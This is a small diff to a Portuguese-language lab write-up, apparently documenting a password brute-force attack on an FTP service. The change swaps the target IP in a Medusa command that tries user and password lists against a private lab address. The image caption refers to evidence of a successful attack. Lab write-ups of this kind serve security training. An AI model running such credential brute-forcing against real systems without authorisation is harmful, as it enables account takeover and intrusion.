@@ -18,7 +18,7 @@ Após criada as listas, um comando é iniciado no programa Medusa para iniciar o
 serão usadas para descobrir o usuário e a senha,respectivamente.
 
 ```bash
-medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 ```
 
 ![Evidência da criação de listas e do ataque usando Medusa](../assets/img/ataque-sucesso.png)
